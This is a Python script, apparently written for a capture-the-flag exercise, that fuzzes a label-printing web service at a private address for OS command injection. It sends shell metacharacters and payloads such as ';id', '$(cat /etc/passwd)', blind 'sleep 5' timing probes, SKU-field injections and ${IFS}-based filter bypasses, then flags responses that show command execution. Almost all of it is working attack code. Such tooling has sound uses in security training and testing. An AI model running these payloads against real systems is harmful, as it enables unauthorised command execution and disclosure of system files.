#!/usr/bin/env python3
"""
CTF command-injection character fuzzer for the ShelfTag label service.
Target: http://10.110.3.72:8041/label
"""
import re
import time
import requests

URL = "http://10.110.3.72:8041/label"
SKU = "A1-042"
MARK = "ZZ9INJ9ZZ"          # unique marker to detect successful echo


def post(text, sku=SKU, timeout=10):
    try:
        t0 = time.time()
        r = requests.post(URL, data={"sku": sku, "text": text}, timeout=timeout)
        return r.status_code, r.text, time.time() - t0
    except requests.exceptions.Timeout:
        return "TIMEOUT", "", timeout
    except Exception as e:
        return "ERR", str(e), 0.0


def extract_pre(body):
    """Pull out the <pre> block that holds the program output."""
    m = re.search(r"<pre[^>]*>(.*?)</pre>", body, re.DOTALL)
    return m.group(1) if m else body[:300]


# ------------------------------------------------------------------
# Setup: baselines & controls
# ------------------------------------------------------------------
def run():
    print("=" * 72)
    print(f"CTF Command-Injection Fuzzer  ->  {URL}")
    print("=" * 72)

    s, b, _ = post("Fiction / Row 4")
    print(f"\n[baseline] status={s}\n  {extract_pre(b).strip()!r}\n")

    _, b, _ = post("MARKAMARKB")
    lit = extract_pre(b).strip()                   # no separator
    _, b, _ = post("MARKA MARKB")
    sep = extract_pre(b).strip()                   # space separator
    print(f"[control] literal = {lit!r}")
    print(f"[control] space   = {sep!r}\n")

    # --------------------------------------------------------------
    # PHASE 1 — single-character reflection
    #   payload = MARKA<c>MARKB.  See if <c> survives, is stripped,
    #   acts as a word separator, or breaks the shell.
    # --------------------------------------------------------------
    print("-" * 72)
    print("PHASE 1: reflection test   (payload = 'MARKA<c>MARKB')")
    print("-" * 72)
    print(f"{'char':>6}  {'status':>7}  {'verdict':<20}  output")

    chars = [';', '|', '&', '$', '`', '<', '>', '(', ')', '{', '}',
             '[', ']', '!', '*', '?', '~', '#', '%', '^', '\\',
             '"', "'", '\t', '\n', '\r', ' ', '=', '/', '.', '-',
             '_', '+', ':', ',', '@']

    weird = []
    for c in chars:
        s, b, _ = post(f"MARKA{c}MARKB")
        out = extract_pre(b).strip() if s == 200 else ""
        if s == "TIMEOUT":
            verdict = "TIMEOUT"
        elif s != 200:
            verdict = f"HTTP {s}"
        elif c not in out:
            verdict = "STRIPPED"
        elif out == lit:
            verdict = "LITERAL"
        elif out == sep:
            verdict = "SEPARATOR"
        else:
            verdict = "DIFF"
            weird.append((c, out))
        print(f"{repr(c):>6}  {str(s):>7}  {verdict:<20}  {out[:70]!r}")

    if weird:
        print("\n  --- interesting / transformed responses ---")
        for c, out in weird:
            print(f"   {repr(c):>6} -> {out!r}")

    # --------------------------------------------------------------
    # PHASE 2 — direct command injection (text field)
    # --------------------------------------------------------------
    print("\n" + "-" * 72)
    print("PHASE 2: direct command-injection payloads (text field)")
    print("-" * 72)
    tests = [
        ("semicolon",       ";id"),
        ("semicolon+space", "; id"),
        ("newline",         "\nid"),
        ("pipe",            "|id"),
        ("or",              "||id"),
        ("amp",             "&id"),
        ("and",             "&&id"),
        ("cmdsub",          "$(id)"),
        ("cmdsub-echo",     f"$(echo {MARK})"),
        ("backtick",        "`id`"),
        ("backtick-echo",   f"`echo {MARK}`"),
        ("nested-cmdsub",   "$(echo $(id))"),
        ("read-passwd",     "$(cat /etc/passwd)"),
        ("brace-expand",    "{id,}"),
        ("dollar-at",       "$@"),
        ("redirect",        ">/tmp/zz; id"),
    ]
    for name, payload in tests:
        s, b, el = post(payload)
        out = extract_pre(b).strip() if s == 200 else ""
        hit = ("uid=" in b) or (MARK in b) or ("root:" in b)
        print(f"{name:<18} status={str(s):>7} hit={str(hit):>5}  {out[:70]!r}")

    # --------------------------------------------------------------
    # PHASE 3 — blind timing
    # --------------------------------------------------------------
    print("\n" + "-" * 72)
    print("PHASE 3: blind timing tests  (looking for >3 s delay)")
    print("-" * 72)
    timing = [
        (";sleep 5;",  ";sleep 5;"),
        ("|sleep 5",   "|sleep 5"),
        ("||sleep 5",  "||sleep 5"),
        ("&&sleep 5",  "&&sleep 5"),
        ("&sleep 5&",  "&sleep 5&"),
        ("$(sleep 5)", "$(sleep 5)"),
        ("`sleep 5`",  "`sleep 5`"),
        ("nl+sleep 5", "\nsleep 5"),
        ("IFS+sleep",  "${IFS}sleep${IFS}5"),
    ]
    for name, payload in timing:
        s, b, el = post(payload, timeout=10)
        flag = "  <<< DELAY" if el > 3.0 else ""
        print(f"{name:<18} status={str(s):>7} elapsed={el:5.2f}s{flag}")

    # --------------------------------------------------------------
    # PHASE 4 — SKU field (may be a second injection point)
    # --------------------------------------------------------------
    print("\n" + "-" * 72)
    print("PHASE 4: SKU field injection test")
    print("-" * 72)
    for name, payload in [(";id", ";id"), ("$(id)", "$(id)"),
                          ("`id`", "`id`"), ("|id", "|id"), ("\\nid", "\nid")]:
        s, b, el = post("normal", sku=payload)
        out = extract_pre(b).strip() if s == 200 else ""
        hit = "uid=" in b
        print(f"sku={name:<10} status={str(s):>7} hit={str(hit):>5}  {out[:70]!r}")

    # --------------------------------------------------------------
    # PHASE 5 — common filter-bypass substitutes
    # --------------------------------------------------------------
    print("\n" + "-" * 72)
    print("PHASE 5: filter-bypass payloads")
    print("-" * 72)
    bypasses = [
        ("IFS-as-space",    "${IFS}id${IFS}"),
        ("IFS$9-as-space",  "$IFS$9id"),
        ("tab-as-space",    "\tid\t"),
        ("newline-as-space","\nid\n"),
        ("brace-cmd",       "{id,}"),
        ("path-var-slash",  "cat${IFS}${PATH:0:1}etc${IFS}${PATH:0:1}passwd"),
        ("printf-semicolon","$(printf '\\x3b')id"),
    ]
    for name, payload in bypasses:
        s, b, el = post(payload)
        out = extract_pre(b).strip() if s == 200 else ""
        hit = ("uid=" in b) or ("root:" in b)
        print(f"{name:<18} status={str(s):>7} hit={str(hit):>5}  {out[:70]!r}")

    print("\n[+] Done.  Look for 'hit=True', 'DELAY', or 'DIFF' reflections.")


if __name__ == "__main__":
    run()
